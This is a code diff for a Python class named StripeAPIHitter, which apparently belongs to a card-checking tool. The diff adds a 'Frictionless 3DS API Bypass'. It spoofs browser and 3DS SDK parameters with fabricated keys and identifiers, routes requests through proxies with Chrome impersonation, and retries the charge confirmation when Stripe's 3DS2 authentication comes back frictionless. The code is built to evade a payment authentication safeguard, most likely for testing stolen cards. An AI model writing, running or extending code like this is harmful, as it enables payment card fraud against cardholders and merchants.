@@ -1623,6 +1623,75 @@ class StripeAPIHitter:
                     result['success'] = True
                     return result
                 elif status == 'requires_action':
+                    # 1% CODER: Frictionless 3DS API Bypass
+                    try:
+                        next_action = confirm_json.get('next_action', {})
+                        if next_action.get('type') == 'use_stripe_sdk':
+                            source_id = next_action['use_stripe_sdk'].get('three_d_secure_2_source')
+                            server_trans_id = next_action['use_stripe_sdk'].get('server_transaction_id')
+                            
+                            if source_id:
+                                # Spoof legitimate browser environment for 3DS evaluation
+                                browser_info = {
+                                    "color_depth": "32",
+                                    "java_enabled": False,
+                                    "language": "en-US",
+                                    "screen_height": "844",
+                                    "screen_width": "390",
+                                    "timezone_offset": "240",
+                                    "user_agent": headers['user-agent']
+                                }
+                                
+                                auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
+                                auth_data = {
+                                    "source": source_id,
+                                    "app[message_version]": "2.1.0",
+                                    "app[device_render_options][sdk_interface]": "03",
+                                    "app[device_render_options][sdk_ui_type][0]": "01",
+                                    "app[device_render_options][sdk_ui_type][1]": "02",
+                                    "app[device_render_options][sdk_ui_type][2]": "03",
+                                    "app[device_render_options][sdk_ui_type][3]": "04",
+                                    "app[device_render_options][sdk_ui_type][4]": "05",
+                                    "app[sdk_ephem_pub_key]": '{"kty":"EC","crv":"P-256","x":"V0x4w98cO6pL41VjQ8T8YmX1qA-P2QOqN8YpQYm9a_E","y":"l1oO3qZ20281Q7A-P9J8v6eA1B2T-QO8pZ9_X-aB2QY"}',
+                                    "app[sdk_reference_number]": "3DS_LOA_SDK_PPDO_020100_00001",
+                                    "app[sdk_trans_id]": server_trans_id or "6291d904-74a4-4dc4-b770-4cc200ffb5d4",
+                                    "browser": json.dumps(browser_info, separators=(',', ':')),
+                                    "key": self.pk_live
+                                }
+                                
+                                auth_res = await loop.run_in_executor(None, lambda: cffi_requests.post(auth_url, headers=headers, data=auth_data, proxies=proxies, timeout=10, impersonate="chrome116"))
+                                auth_json = auth_res.json()
+                                
+                                state = auth_json.get('state')
+                                if state == 'frictionless':
+                                    # Frictionless successful, confirm the charge again
+                                    confirm_data_2 = {
+                                        "payment_method": pm_id,
+                                        "key": self.pk_live,
+                                        "expected_payment_method_type": "card"
+                                    }
+                                    confirm_res_2 = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=headers, data=confirm_data_2, proxies=proxies, timeout=15, impersonate="chrome116"))
+                                    confirm_json_2 = confirm_res_2.json()
+                                    
+                                    status_2 = confirm_json_2.get('status')
+                                    if status_2 == 'succeeded' or status_2 == 'requires_capture':
+                                        result['success'] = True
+                                    else:
+                                        err = confirm_json_2.get('error', {})
+                                        result['decline_code'] = err.get('decline_code', err.get('code', status_2))
+                                    return result
+                                    
+                                elif state == 'challenge_required':
+                                    # Hard 3DS Challenge
+                                    result['decline_code'] = '3d_secure_required_hard'
+                                    return result
+                                else:
+                                    result['decline_code'] = '3d_secure_auth_failed'
+                                    return result
+                    except Exception as ex:
+                        print(f"DEBUG: 3DS Frictionless bypass failed: {ex}")
+                        pass
+                        
                     result['decline_code'] = '3d_secure_required'
                     return result
                 else:
